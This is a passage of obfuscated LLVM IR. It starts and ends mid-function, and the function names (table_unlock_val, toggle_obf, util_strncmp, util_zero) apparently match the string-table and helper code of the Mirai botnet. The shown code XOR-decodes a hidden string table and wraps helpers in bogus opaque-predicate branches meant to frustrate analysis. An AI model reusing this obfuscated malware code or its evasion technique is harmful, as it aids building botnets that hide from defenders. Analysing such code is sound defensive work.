  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* @x.39
  %70 = load i32, i32* @y.40
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart24, %originalBBpart2
  br label %5

; <label>:78:                                     ; preds = %5
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %11
  %79 = call i32 @rand_next()
  %80 = load i8*, i8** %3, align 8
  %81 = bitcast i8* %80 to i32*
  store i32 %79, i32* %81, align 4
  %82 = load i8*, i8** %3, align 8
  %83 = getelementptr inbounds i8, i8* %82, i64 4
  store i8* %83, i8** %3, align 8
  %84 = load i32, i32* %4, align 4
  %85 = sext i32 %84 to i64
  %_ = shl i64 %85, 4
  %86 = sub i64 %85, 4
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %4, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %99, %1
  %28 = load i32, i32* @x.43
  %29 = load i32, i32* @y.44
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %3, align 4
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = icmp slt i32 %36, %40
  %42 = load i32, i32* @x.43
  %43 = load i32, i32* @y.44
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %41, label %50, label %102

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, %52
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %58, align 1
  %63 = load i8, i8* %6, align 1
  %64 = zext i8 %63 to i32
  %65 = load %struct.table_value*, %struct.table_value** %4, align 8
  %66 = getelementptr inbounds %struct.table_value, %struct.table_value* %65, i32 0, i32 0
  %67 = load i8*, i8** %66, align 8
  %68 = load i32, i32* %3, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = xor i32 %72, %64
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %70, align 1
  %75 = load i8, i8* %7, align 1
  %76 = zext i8 %75 to i32
  %77 = load %struct.table_value*, %struct.table_value** %4, align 8
  %78 = getelementptr inbounds %struct.table_value, %struct.table_value* %77, i32 0, i32 0
  %79 = load i8*, i8** %78, align 8
  %80 = load i32, i32* %3, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = xor i32 %84, %76
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %82, align 1
  %87 = load i8, i8* %8, align 1
  %88 = zext i8 %87 to i32
  %89 = load %struct.table_value*, %struct.table_value** %4, align 8
  %90 = getelementptr inbounds %struct.table_value, %struct.table_value* %89, i32 0, i32 0
  %91 = load i8*, i8** %90, align 8
  %92 = load i32, i32* %3, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = xor i32 %96, %88
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %94, align 1
  br label %99

; <label>:99:                                     ; preds = %50
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  br label %27

; <label>:102:                                    ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %103 = load i32, i32* %3, align 4
  %104 = load %struct.table_value*, %struct.table_value** %4, align 8
  %105 = getelementptr inbounds %struct.table_value, %struct.table_value* %104, i32 0, i32 1
  %106 = load i16, i16* %105, align 8
  %107 = zext i16 %106 to i32
  %108 = icmp slt i32 %103, %107
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %33

; <label>:11:                                     ; preds = %2
  %12 = load i32, i32* @x.47
  %13 = load i32, i32* @y.48
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load %struct.table_value*, %struct.table_value** %5, align 8
  %21 = getelementptr inbounds %struct.table_value, %struct.table_value* %20, i32 0, i32 1
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = load i32*, i32** %4, align 8
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @x.47
  %26 = load i32, i32* @y.48
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %2
  %34 = load %struct.table_value*, %struct.table_value** %5, align 8
  %35 = getelementptr inbounds %struct.table_value, %struct.table_value* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  ret i8* %36

originalBBalteredBB:                              ; preds = %originalBB, %11
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = load i32*, i32** %4, align 8
  store i32 %40, i32* %41, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %originalBBpart2, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* @x.49
  %12 = load i32, i32* @y.50
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %3, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* @x.49
  %22 = load i32, i32* @y.50
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %4

; <label>:29:                                     ; preds = %4
  %30 = load i32, i32* @x.49
  %31 = load i32, i32* @y.50
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* @x.49
  %40 = load i32, i32* @y.50
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %10
  %47 = load i32, i32* %3, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  %49 = load i32, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strncmp(i8*, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %7, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %21, label %17

; <label>:17:                                     ; preds = %3
  %18 = load i32, i32* %9, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %38

; <label>:21:                                     ; preds = %17, %3
  %22 = load i32, i32* @x.51
  %23 = load i32, i32* @y.52
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  store i8 0, i8* %4, align 1
  %30 = load i32, i32* @x.51
  %31 = load i32, i32* @y.52
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %88

; <label>:38:                                     ; preds = %17
  br label %39

; <label>:39:                                     ; preds = %70, %38
  %40 = load i32, i32* %7, align 4
  %41 = add nsw i32 %40, -1
  store i32 %41, i32* %7, align 4
  %42 = icmp ne i32 %40, 0
  br i1 %42, label %43, label %71

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %5, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %5, align 8
  %46 = load i8, i8* %44, align 1
  %47 = sext i8 %46 to i32
  %48 = load i8*, i8** %6, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %6, align 8
  %50 = load i8, i8* %48, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp ne i32 %47, %51
  br i1 %52, label %53, label %70

; <label>:53:                                     ; preds = %43
  %54 = load i32, i32* @x.51
  %55 = load i32, i32* @y.52
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  store i8 0, i8* %4, align 1
  %62 = load i32, i32* @x.51
  %63 = load i32, i32* @y.52
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %88

; <label>:70:                                     ; preds = %43
  br label %39

; <label>:71:                                     ; preds = %39
  %72 = load i32, i32* @x.51
  %73 = load i32, i32* @y.52
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  store i8 1, i8* %4, align 1
  %80 = load i32, i32* @x.51
  %81 = load i32, i32* @y.52
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %88

; <label>:88:                                     ; preds = %originalBBpart28, %originalBBpart24, %originalBBpart2
  %89 = load i32, i32* @x.51
  %90 = load i32, i32* @y.52
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i8, i8* %4, align 1
  %98 = load i32, i32* @x.51
  %99 = load i32, i32* @y.52
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i8 %97

originalBBalteredBB:                              ; preds = %originalBB, %21
  store i8 0, i8* %4, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  store i8 0, i8* %4, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  store i8 1, i8* %4, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %106 = load i8, i8* %4, align 1
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strcmp(i8*, i8*) #0 {
  %3 = load i32, i32* @x.53
  %4 = load i32, i32* @y.54
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %16 = load i8*, i8** %12, align 8
  %17 = call i32 @util_strlen(i8* %16)
  store i32 %17, i32* %14, align 4
  %18 = load i8*, i8** %13, align 8
  %19 = call i32 @util_strlen(i8* %18)
  store i32 %19, i32* %15, align 4
  %20 = load i32, i32* %14, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp ne i32 %20, %21
  %23 = load i32, i32* @x.53
  %24 = load i32, i32* @y.54
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i8 0, i8* %11, align 1
  br label %66

; <label>:32:                                     ; preds = %originalBBpart2
  br label %33

; <label>:33:                                     ; preds = %48, %32
  %34 = load i32, i32* %14, align 4
  %35 = add nsw i32 %34, -1
  store i32 %35, i32* %14, align 4
  %36 = icmp ne i32 %34, 0
  br i1 %36, label %37, label %49

; <label>:37:                                     ; preds = %33
  %38 = load i8*, i8** %12, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %12, align 8
  %40 = load i8, i8* %38, align 1
  %41 = sext i8 %40 to i32
  %42 = load i8*, i8** %13, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %13, align 8
  %44 = load i8, i8* %42, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp ne i32 %41, %45
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %37
  store i8 0, i8* %11, align 1
  br label %66

; <label>:48:                                     ; preds = %37
  br label %33

; <label>:49:                                     ; preds = %33
  %50 = load i32, i32* @x.53
  %51 = load i32, i32* @y.54
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  store i8 1, i8* %11, align 1
  %58 = load i32, i32* @x.53
  %59 = load i32, i32* @y.54
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %66

; <label>:66:                                     ; preds = %originalBBpart24, %47, %31
  %67 = load i8, i8* %11, align 1
  ret i8 %67

originalBBalteredBB:                              ; preds = %originalBB, %2
  %68 = alloca i8, align 1
  %69 = alloca i8*, align 8
  %70 = alloca i8*, align 8
  %71 = alloca i32, align 4
  %72 = alloca i32, align 4
  store i8* %0, i8** %69, align 8
  store i8* %1, i8** %70, align 8
  %73 = load i8*, i8** %69, align 8
  %74 = call i32 @util_strlen(i8* %73)
  store i32 %74, i32* %71, align 4
  %75 = load i8*, i8** %70, align 8
  %76 = call i32 @util_strlen(i8* %75)
  store i32 %76, i32* %72, align 4
  %77 = load i32, i32* %71, align 4
  %78 = load i32, i32* %72, align 4
  %79 = icmp ne i32 %77, %78
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  store i8 1, i8* %11, align 1
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = load i32, i32* @x.57
  %5 = load i32, i32* @y.58
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  store i32 %2, i32* %14, align 4
  %17 = load i8*, i8** %12, align 8
  store i8* %17, i8** %15, align 8
  %18 = load i8*, i8** %13, align 8
  store i8* %18, i8** %16, align 8
  %19 = load i32, i32* @x.57
  %20 = load i32, i32* @y.58
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %originalBBpart24, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = add nsw i32 %28, -1
  store i32 %29, i32* %14, align 4
  %30 = icmp ne i32 %28, 0
  br i1 %30, label %31, label %53

; <label>:31:                                     ; preds = %27
  %32 = load i32, i32* @x.57
  %33 = load i32, i32* @y.58
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = load i8*, i8** %16, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %16, align 8
  %42 = load i8, i8* %40, align 1
  %43 = load i8*, i8** %15, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %15, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* @x.57
  %46 = load i32, i32* @y.58
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %27

; <label>:53:                                     ; preds = %27
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %54 = alloca i8*, align 8
  %55 = alloca i8*, align 8
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i8*, align 8
  store i8* %0, i8** %54, align 8
  store i8* %1, i8** %55, align 8
  store i32 %2, i32* %56, align 4
  %59 = load i8*, i8** %54, align 8
  store i8* %59, i8** %57, align 8
  %60 = load i8*, i8** %55, align 8
  store i8* %60, i8** %58, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %61 = load i8*, i8** %16, align 8
  %62 = getelementptr inbounds i8, i8* %61, i32 1
  store i8* %62, i8** %16, align 8
  %63 = load i8, i8* %61, align 1
  %64 = load i8*, i8** %15, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %15, align 8
  store i8 %63, i8* %64, align 1
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %originalBBpart28, %2
  %8 = load i32, i32* @x.59
  %9 = load i32, i32* @y.60
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %4, align 4
  %17 = add nsw i32 %16, -1
  store i32 %17, i32* %4, align 4
  %18 = icmp ne i32 %16, 0
  %19 = load i32, i32* @x.59
  %20 = load i32, i32* @y.60
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %18, label %27, label %46

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = load i32, i32* @x.59
  %29 = load i32, i32* @y.60
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %27
  %36 = load i8*, i8** %5, align 8
  %37 = getelementptr inbounds i8, i8* %36, i32 1
  store i8* %37, i8** %5, align 8
  store i8 0, i8* %36, align 1
  %38 = load i32, i32* @x.59
  %39 = load i32, i32* @y.60
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %7

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.59
  %48 = load i32, i32* @y.60
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %46
  %55 = load i32, i32* @x.59
  %56 = load i32, i32* @y.60
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %63 = load i32, i32* %4, align 4
  %_ = shl i32 %63, -1
